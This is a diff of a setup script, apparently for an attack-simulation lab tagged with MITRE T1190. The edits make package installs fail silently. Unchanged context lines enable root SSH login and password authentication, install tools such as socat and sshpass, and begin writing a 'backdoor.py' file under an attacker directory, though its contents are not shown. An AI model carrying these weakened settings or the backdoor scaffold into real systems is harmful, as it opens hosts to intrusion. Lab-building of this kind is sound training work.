@@ -2,11 +2,11 @@
 #
 ## Global commands
 #
-apt-get update
-apt-get install -y python3 python3-pip sshpass curl socat wget
+: # apt-get update (offline: pacotes ja instalados no build)
+apt-get install -y python3 python3-pip sshpass curl socat wget 2>/dev/null || true
 
 ## SSH
-apt-get install -y openssh-server
+apt-get install -y openssh-server 2>/dev/null || true
 mkdir -p /var/run/sshd
 echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
 echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
@@ -34,7 +34,7 @@ pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &
 
 ################################################ End of Global Section
 # T1190
-pip3 install --break-system-packages flask flask-cors requests
+pip3 install --break-system-packages flask flask-cors requests 2>/dev/null || true
 mkdir -p /home/attacker/malware
 cat > /home/attacker/malware/backdoor.py << 'EOF'
 #!/usr/bin/env python3
